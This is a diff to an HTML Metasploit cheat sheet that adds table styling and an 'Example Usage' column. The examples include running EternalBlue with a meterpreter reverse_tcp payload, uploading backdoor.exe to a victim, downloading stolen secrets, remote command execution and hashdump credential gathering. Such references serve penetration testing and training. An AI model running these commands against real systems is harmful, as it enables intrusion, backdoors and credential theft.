@@ -23,6 +23,7 @@
             width: 100%;
             border-collapse: collapse;
             margin-bottom: 20px;
+            table-layout: fixed;
         }
 
         table tr {
@@ -32,10 +33,23 @@
             padding: 10px;
             border: 1px solid #ddd;
             text-align: left;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
         }
         th {
             background-color: #f2f2f2;
         }
+            th:nth-child(1), td:nth-child(1) { width: 20%; }
+        th:nth-child(2), td:nth-child(2) { width: 40%; }
+        th:nth-child(3), td:nth-child(3) { width: 40%; }
+        code {
+            background-color: #e4e4e4;
+            padding: 2px 4px;
+            border-radius: 4px;
+            font-family: monospace;
+            white-space: nowrap;
+        }
+
         code {
             background-color: #e4e4e4;
             padding: 2px 4px;
@@ -71,56 +85,69 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>msfconsole</code></td>
             <td>Start Metasploit console</td>
+            <td><code>$ msfconsole</code></td>
         </tr>
         <tr>
             <td><code>search &lt;keyword&gt;</code></td>
             <td>Search for exploits, payloads, auxiliary modules</td>
+            <td><code>msf> search apache</code></td>
         </tr>
         <tr>
             <td><code>info &lt;module&gt;</code></td>
             <td>Display detailed information about a module</td>
+            <td><code>msf> info exploit/windows/smb/ms17_010_eternalblue</code></td>
         </tr>
         <tr>
             <td><code>use &lt;module&gt;</code></td>
             <td>Use a specific module</td>
+            <td><code>msf> use exploit/windows/smb/ms17_010_eternalblue</code></td>
         </tr>
         <tr>
             <td><code>set &lt;option&gt; &lt;value&gt;</code></td>
             <td>Set options for a module</td>
+            <td><code>msf> set RHOSTS 192.168.1.100</code></td>
         </tr>
         <tr>
             <td><code>show options</code></td>
             <td>Show options for a module</td>
+            <td><code>msf> show options</code></td>
         </tr>
         <tr>
             <td><code>show payloads</code></td>
             <td>Show available payloads</td>
+            <td><code>msf> show payloads</code></td>
         </tr>
         <tr>
             <td><code>show encoders</code></td>
             <td>Show available encoders</td>
+            <td><code>msf> show encoders</code></td>
         </tr>
         <tr>
             <td><code>show nops</code></td>
             <td>Show available NOPS</td>
+            <td><code>msf> show nops</code></td>
         </tr>
         <tr>
             <td><code>show post</code></td>
             <td>Show available post-exploitation modules</td>
+            <td><code>msf> show post</code></td>
         </tr>
         <tr>
             <td><code>set payload &lt;payload&gt;</code></td>
             <td>Set the payload to be used with the exploit</td>
+            <td><code>msf> set payload windows/x64/meterpreter/reverse_tcp</code></td>
         </tr>
         <tr>
             <td><code>exploit</code></td>
             <td>Run the exploit</td>
+            <td><code>msf> exploit</code></td>
         </tr>
     </tbody>
 </table>
@@ -131,24 +158,29 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>ifconfig</code></td>
             <td>Show network interfaces</td>
+            <td><code>msf> ifconfig</code></td>
         </tr>
         <tr>
             <td><code>route</code></td>
             <td>Show routing table</td>
+            <td><code>msf> route</code></td>
         </tr>
         <tr>
             <td><code>route add &lt;subnet&gt; &lt;netmask&gt; &lt;gateway&gt;</code></td>
             <td>Add a route</td>
+            <td><code>msf> route add 192.168.1.0 255.255.255.0 1</code></td>
         </tr>
         <tr>
             <td><code>route remove &lt;subnet&gt; &lt;netmask&gt; &lt;gateway&gt;</code></td>
             <td>Remove a route</td>
+            <td><code>msf> route remove 192.168.1.0 255.255.255.0 1</code></td>
         </tr>
     </tbody>
 </table>
@@ -159,36 +191,44 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>db_connect &lt;user&gt;:&lt;pass&gt;@&lt;host&gt;/&lt;database&gt;</code></td>
             <td>Connect to the database</td>
+            <td><code>msf> db_connect user:password@localhost/msf</code></td>
         </tr>
         <tr>
             <td><code>workspace -a &lt;workspace_name&gt;</code></td>
             <td>Create a new workspace</td>
+            <td><code>msf> workspace -a project1</code></td>
         </tr>
         <tr>
             <td><code>workspace &lt;workspace_name&gt;</code></td>
             <td>Switch between workspaces</td>
+            <td><code>msf> workspace project1</code></td>
         </tr>
         <tr>
             <td><code>hosts</code></td>
             <td>List hosts in the database</td>
+            <td><code>msf> hosts</code></td>
         </tr>
         <tr>
             <td><code>services</code></td>
             <td>List services in the database</td>
+            <td><code>msf> services</code></td>
         </tr>
         <tr>
             <td><code>vulns</code></td>
             <td>List vulnerabilities in the database</td>
+            <td><code>msf> vulns</code></td>
         </tr>
         <tr>
             <td><code>notes</code></td>
             <td>List notes in the database</td>
+            <td><code>msf> notes</code></td>
         </tr>
     </tbody>
 </table>
@@ -199,36 +239,44 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>background</code></td>
             <td>Background the current session</td>
+            <td><code>meterpreter> background</code></td>
         </tr>
         <tr>
             <td><code>sessions -l</code></td>
             <td>List all background sessions</td>
+            <td><code>msf> sessions -l</code></td>
         </tr>
         <tr>
             <td><code>sessions -i &lt;session_id&gt;</code></td>
             <td>Interact with a background session</td>
+            <td><code>msf> sessions -i 1</code></td>
         </tr>
         <tr>
             <td><code>upload &lt;local_path&gt; &lt;remote_path&gt;</code></td>
             <td>Upload a file to the victim machine</td>
+            <td><code>meterpreter> upload /home/attacker/backdoor.exe C:\\Windows\\backdoor.exe</code></td>
         </tr>
         <tr>
             <td><code>download &lt;remote_path&gt; &lt;local_path&gt;</code></td>
             <td>Download a file from the victim machine</td>
+            <td><code>meterpreter> download C:\\secrets.txt /home/attacker/stolen_secrets.txt</code></td>
         </tr>
         <tr>
             <td><code>execute -f &lt;command&gt;</code></td>
             <td>Run a shell command on the victim machine</td>
+            <td><code>meterpreter> execute -f cmd.exe -a "/c whoami"</code></td>
         </tr>
         <tr>
             <td><code>screenshot</code></td>
             <td>Take a screenshot of the victim machine's desktop</td>
+            <td><code>meterpreter> screenshot</code></td>
         </tr>
     </tbody>
 </table>
@@ -239,20 +287,24 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>use auxiliary/scanner/&lt;scanner_module&gt;</code></td>
             <td>Use an auxiliary scanner</td>
+            <td><code>msf> use auxiliary/scanner/smb/smb_version</code></td>
         </tr>
         <tr>
             <td><code>set RHOSTS &lt;target_ip_range&gt;</code></td>
             <td>Set RHOSTS for scanners</td>
+            <td><code>msf> set RHOSTS 192.168.1.0/24</code></td>
         </tr>
         <tr>
             <td><code>run</code></td>
             <td>Run an auxiliary module</td>
+            <td><code>msf> run</code></td>
         </tr>
     </tbody>
 </table>
@@ -263,20 +315,24 @@
         <tr>
             <th>Command</th>
             <th>Description</th>
+            <th>Example Usage</th>
         </tr>
     </thead>
     <tbody>
         <tr>
             <td><code>use post/&lt;post_exploit_module&gt;</code></td>
             <td>Use a post-exploitation module</td>
+            <td><code>msf> use post/windows/gather/hashdump</code></td>
         </tr>
         <tr>
             <td><code>set SESSION &lt;session_id&gt;</code></td>
             <td>Set SESSION for post modules</td>
+            <td><code>msf> set SESSION 1</code></td>
         </tr>
         <tr>
             <td><code>run</code></td>
             <td>Run a post module</td>
+            <td><code>msf> run</code></td>
         </tr>
     </tbody>
 </table>
